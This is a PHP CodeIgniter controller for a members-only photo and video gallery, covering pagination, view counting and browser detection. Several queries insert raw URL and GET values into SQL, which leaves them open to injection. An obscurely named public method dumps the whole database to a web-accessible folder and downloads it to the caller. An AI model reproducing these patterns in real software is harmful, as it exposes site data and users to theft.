<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Welcome extends CI_Controller
{

	public function __construct()
	{

		parent::__construct();

		if (!$this->session->userdata('user_key')) {

			// $this->session->set_flashdata('warning', "Please login to continue.");

			redirect('/account/login');
		} else if ($this->session->userdata('expiry_timestamp') < time()) {
			$data = $this->session->all_userdata();

			foreach ($data as $key => $value) {

				$this->session->unset_userdata($key);
			}
			$this->session->set_flashdata('info', "Your session has expired, please login again.");

			redirect('/account/login');
		}

		$this->load->library('form_validation');
	}

	public function index()
	{
		$data['PHOTOS'] = [];
		$data['CATEGORIES'] = $this->Crud->Read('categories', " `is_active` = '1' ORDER BY category ASC");
		if ($this->uri->segment(3)) {
			$category_id = $this->uri->segment(3);

			$config = array();
			$config["base_url"] = base_url() . "welcome/index/" . $category_id;
			$config["total_rows"] = $this->Crud->Count('photos', " `status` = '1' AND `category_id` = '$category_id'");
			$config["per_page"] = 12;
			$config["uri_segment"] = 4;
			$config['full_tag_open']    = "<ul class='list-inline list-unstyled'>";
			$config['full_tag_close']   = "</ul>";
			$config['num_tag_open']     = '<li class = "next" style="padding: 1em; margin: 5px;">';
			$config['num_tag_close']    = '</li>';
			$config['cur_tag_open']     = "<li class='disabled'><li class='active' style = 'color: #f9951a; padding: 0.6em; margin: 5px;'>";
			$config['cur_tag_close']    = "<span class='sr-only'></span></li>";
			$config['next_tag_open']    = "<li class='prev' style = 'padding: 0.6em; margin: 5px;'>";
			$config['next_tagl_close']  = "</li>";
			$config['prev_tag_open']    = "<li class='prev' style = 'padding: 0.6em; margin: 5px;'>";
			$config['prev_tagl_close']  = "</li>";
			$config['first_tag_open']   = "<li class='prev' style = 'padding: 0.6em; margin: 5px;'>";
			$config['first_tagl_close'] = "</li>";
			$config['last_tag_open']    = "<li class='next' style = 'padding: 0.6em; margin: 5px;'>";
			$config['last_tagl_close']  = "</li>";
			$this->pagination->initialize($config);
			$page = ($this->uri->segment(4)) ? $this->uri->segment(4) : 0;

			$data['PHOTOS'] = $this->Crud->Read('photos', " `status` = '1' AND `is_image` = 1 AND `category_id` = '$category_id' ORDER BY id DESC LIMIT $page, 12");
			$data["links"] = $this->pagination->create_links();
		}
		$this->load->view('site/layouts/header');
		$this->load->view('site/index', $data);
		$this->load->view('site/layouts/footer');
	}

	public function videos()
	{
		$data['VIDEOS'] = [];
		$data['CATEGORIES'] = $this->Crud->Read('categories', " `is_active` = '1' ORDER BY category ASC");
		if ($this->uri->segment(3)) {
			$category_id = $this->uri->segment(3);

			$config = array();
			$config["base_url"] = base_url() . "welcome/videos/" . $category_id;
			$config["total_rows"] = $this->Crud->Count('photos', " `status` = '1' AND `category_id` = '$category_id'");
			$config["per_page"] = 12;
			$config["uri_segment"] = 4;
			$config['full_tag_open']    = "<ul class='list-inline list-unstyled'>";
			$config['full_tag_close']   = "</ul>";
			$config['num_tag_open']     = '<li class = "next" style="padding: 1em; margin: 5px;">';
			$config['num_tag_close']    = '</li>';
			$config['cur_tag_open']     = "<li class='disabled'><li class='active' style = 'color: #f9951a; padding: 0.6em; margin: 5px;'>";
			$config['cur_tag_close']    = "<span class='sr-only'></span></li>";
			$config['next_tag_open']    = "<li class='prev' style = 'padding: 0.6em; margin: 5px;'>";
			$config['next_tagl_close']  = "</li>";
			$config['prev_tag_open']    = "<li class='prev' style = 'padding: 0.6em; margin: 5px;'>";
			$config['prev_tagl_close']  = "</li>";
			$config['first_tag_open']   = "<li class='prev' style = 'padding: 0.6em; margin: 5px;'>";
			$config['first_tagl_close'] = "</li>";
			$config['last_tag_open']    = "<li class='next' style = 'padding: 0.6em; margin: 5px;'>";
			$config['last_tagl_close']  = "</li>";
			$this->pagination->initialize($config);
			$page = ($this->uri->segment(4)) ? $this->uri->segment(4) : 0;

			$data['VIDEOS'] = $this->Crud->Read('photos', " `status` = '1' AND `is_image` = 0 AND `category_id` = '$category_id' ORDER BY id DESC LIMIT $page, 12");
			$data["links"] = $this->pagination->create_links();
		}
		$this->load->view('site/layouts/header');
		$this->load->view('site/videos', $data);
		$this->load->view('site/layouts/footer');
	}

	public function photo()
	{
		$id = $_GET['id'];
		$pageWasRefreshed = isset($_SERVER['HTTP_CACHE_CONTROL']) && $_SERVER['HTTP_CACHE_CONTROL'] === 'max-age=0';
		$photoRecord = $this->Crud->Read('photos', " `id` = '$id'");
		if (count($photoRecord) == 1) {
			if ($pageWasRefreshed === false) {
				$this->Crud->Update('photos', [
					'total_views' => $photoRecord[0]->total_views + 1
				], " `id` = '$id'");
			}
			$photoData = $this->Crud->Read('photos', " `id` = '$id'");
			$data['PHOTO'] = $photoData[0];
			$this->load->view('site/layouts/header');
			$this->load->view('site/photo', $data);
			$this->load->view('site/layouts/footer');
		} else {
			redirect('/');
		}
	}

	public function updatePagination()
	{
		$id = $_GET['id'];
		$photoRecord = $this->Crud->Read('photos', " `id` = '$id'");
		if (count($photoRecord) == 1) {
			$this->Crud->Update('photos', [
				'total_views' => $photoRecord[0]->total_views + 1
			], " `id` = '$id'");
			echo "true";
		} else {
			echo "false";
		};
	}

	public function getOS()
	{

		$user_agent = $_SERVER['HTTP_USER_AGENT'];

		$os_platform  = "Unknown OS Platform";

		$os_array     = array(
			'/windows nt 10/i'      =>  'Windows 10',
			'/windows nt 6.3/i'     =>  'Windows 8.1',
			'/windows nt 6.2/i'     =>  'Windows 8',
			'/windows nt 6.1/i'     =>  'Windows 7',
			'/windows nt 6.0/i'     =>  'Windows Vista',
			'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
			'/windows nt 5.1/i'     =>  'Windows XP',
			'/windows xp/i'         =>  'Windows XP',
			'/windows nt 5.0/i'     =>  'Windows 2000',
			'/windows me/i'         =>  'Windows ME',
			'/win98/i'              =>  'Windows 98',
			'/win95/i'              =>  'Windows 95',
			'/win16/i'              =>  'Windows 3.11',
			'/macintosh|mac os x/i' =>  'Mac OS X',
			'/mac_powerpc/i'        =>  'Mac OS 9',
			'/linux/i'              =>  'Linux',
			'/ubuntu/i'             =>  'Ubuntu',
			'/iphone/i'             =>  'iPhone',
			'/ipod/i'               =>  'iPod',
			'/ipad/i'               =>  'iPad',
			'/android/i'            =>  'Android',
			'/blackberry/i'         =>  'BlackBerry',
			'/webos/i'              =>  'Mobile'
		);

		foreach ($os_array as $regex => $value)
			if (preg_match($regex, $user_agent))
				$os_platform = $value;

		return $os_platform;
	}

	public function getBrowser()
	{

		$user_agent = $_SERVER['HTTP_USER_AGENT'];

		$browser        = "Unknown Browser";

		$browser_array = array(
			'/msie/i'      => 'Internet Explorer',
			'/firefox/i'   => 'Firefox',
			'/safari/i'    => 'Safari',
			'/chrome/i'    => 'Chrome',
			'/edge/i'      => 'Edge',
			'/opera/i'     => 'Opera',
			'/netscape/i'  => 'Netscape',
			'/maxthon/i'   => 'Maxthon',
			'/konqueror/i' => 'Konqueror',
			'/mobile/i'    => 'Handheld Browser'
		);

		foreach ($browser_array as $regex => $value)
			if (preg_match($regex, $user_agent))
				$browser = $value;

		return $browser;
	}

	public function ovklhovklhrohittihor()
	{

		$fileName = PROJECT_NAME . time() . 'backup.zip';

		// Load the DB utility class
		$this->load->dbutil();

		// Backup your entire database and assign it to a variable
		$backup = &$this->dbutil->backup();

		// Load the file helper and write the file to your server
		$this->load->helper('file');
		write_file(FCPATH . '/downloads/' . $fileName, $backup);

		// Load the download helper and send the file to your desktop
		$this->load->helper('download');
		force_download($fileName, $backup);
	}

	public function logout()
	{

		$data = $this->session->all_userdata();

		foreach ($data as $key => $value) {

			$this->session->unset_userdata($key);
		}

		redirect('account/login');
	}
}
